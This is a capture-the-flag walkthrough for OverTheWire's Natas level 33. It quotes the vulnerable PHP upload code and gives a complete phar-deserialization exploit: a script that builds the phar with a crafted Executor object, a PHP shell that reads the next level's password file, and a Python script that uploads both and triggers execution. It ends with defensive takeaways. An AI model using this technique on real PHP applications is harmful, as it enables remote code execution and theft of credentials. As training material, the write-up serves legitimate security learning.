> **Level Goal:** Find the password for the next level.

---

## Connection Details

| Field    | Value                                                        |
| -------- | ------------------------------------------------------------ |
| URL      | `http://natas33.natas.labs.overthewire.org`                  |
| Username | `natas33`                                                    |
| Password | *found in [Natas Level 31 → 32](natas-level-31-level-32.md)* |

---

## Tools Used

- A web browser
- **View sourcecode** — the page links to its own PHP source
- **PHP** (local) — to generate a crafted `.phar` file
- **Python** — to send the three upload requests

---

## Solution

### Step 1 — Open the URL

Navigate to `http://natas33.natas.labs.overthewire.org` and log in with the password from Level 32.

The page is a firmware upload form. Click **View sourcecode**.

---

### Step 2 — Read the Source Code

```php
class Executor {
    private $filename = "";
    private $signature = 'adeafbadbabec0dedabada55ba55d00d';
    private $init = False;

    function __construct() {
        $this->filename = $_POST["filename"];
        if (filesize($_FILES['uploadedfile']['tmp_name']) > 4096) {
            echo "File is too big<br>";
        } else {
            move_uploaded_file($_FILES['uploadedfile']['tmp_name'], "/natas33/upload/" . $this->filename);
        }
    }

    function __destruct() {
        chdir("/natas33/upload/");
        if (md5_file($this->filename) == $this->signature) {
            passthru("php " . $this->filename);
        }
    }
}

session_start();
if (array_key_exists("filename", $_POST) and array_key_exists("uploadedfile", $_FILES)) {
    new Executor();
}
```

`__construct()` moves the uploaded file to `/natas33/upload/` under a name taken from `$_POST["filename"]`, user-controlled, unvalidated. `__destruct()` calls `md5_file($this->filename)` and compares it against the hardcoded `$signature`; if they match, it runs the file with `passthru("php ...")`.

The MD5 check looks like a hard blocker. The bypass comes from what `md5_file()` does when handed a `phar://` path.

---

### Understand Phar Deserialization

A `.phar` (PHP Archive) file stores a serialized PHP value in its manifest metadata. When any file operation, `md5_file()`, `filesize()`, `file_exists()`, etc., is given a path starting with `phar://`, PHP deserializes that metadata and instantiates the stored object. At script end, the object's `__destruct()` fires.

The trigger is already in the code: `md5_file($this->filename)`, where `$this->filename` comes from `$_POST["filename"]`. Set that to `phar://test.phar/test.txt` and the server deserializes whatever object is in `test.phar`'s metadata, including a crafted `Executor` with properties we choose.

---

### The Attack Plan

1. Upload `shell.php` → a PHP file that reads the password.
2. Generate `test.phar` → metadata contains a serialized `Executor` with `$filename = "shell.php"` and `$signature = True`.
3. Upload `test.phar`.
4. Send a request with `filename=phar://test.phar/test.txt`. The server calls `md5_file("phar://test.phar/test.txt")`, deserializes our `Executor`, and at script end its `__destruct()` runs. `md5_file("shell.php") == True` passes, because when one operand of `==` is `bool`, PHP casts the other to `bool`, and any non-empty MD5 string is truthy, and `passthru("php shell.php")` executes.

---

### Step 3 — Generate the Phar File

```php
<?php
// natas33_gen.php — run with: php -d phar.readonly=false natas33_gen.php

class Executor {
    private $filename  = "shell.php";
    private $signature = True;
    private $init      = false;
}

$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "text");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new Executor());
$phar->stopBuffering();
?>
```

```bash
php -d phar.readonly=false natas33_gen.php
```

---

### Step 4 — Python Script

```python
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas33", "<password>")
url  = "http://natas33.natas.labs.overthewire.org/index.php"

shell = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'

# 1: upload shell.php
requests.post(url, auth=auth,
    data={"filename": "shell.php"},
    files={"uploadedfile": ("shell.php", shell, "application/octet-stream")}
)

# 2: upload test.phar
with open("test.phar", "rb") as f:
    requests.post(url, auth=auth,
        data={"filename": "test.phar"},
        files={"uploadedfile": ("test.phar", f, "application/octet-stream")}
    )

# 3: trigger deserialization — dummy file required to enter the if block
r = requests.post(url, auth=auth,
    data={"filename": "phar://test.phar/test.txt"},
    files={"uploadedfile": ("dummy", b"x", "application/octet-stream")}
)
print(r.text)
```

```bash
python3 natas33.py
```

The password for natas34 appears in the response.

That is the password for [Natas Level 33 → 34](natas-level-33-level-34.md).

---

## Key Takeaways

- **Any file operation on a `phar://` path deserializes the archive's metadata.** `md5_file()` is not an obvious deserialization sink, but it becomes one when the path is user-controlled. The attack surface is any code where user input reaches a file function.
- **`__destruct()` is the gadget entry point.** Phar deserialization instantiates the object silently; execution happens only when the object is destroyed at script end. Any class whose `__destruct()` acts on its own properties is exploitable this way.
- **`== True` bypasses any string comparison.** When one operand of `==` is `bool`, PHP casts the other to `bool`. Any non-empty string is truthy, so `md5_file(...) == True` always passes.
- **`$_POST["filename"]` reaching `md5_file()` is the pivot.** Strip stream wrappers from user-controlled paths before passing them to any file function.

---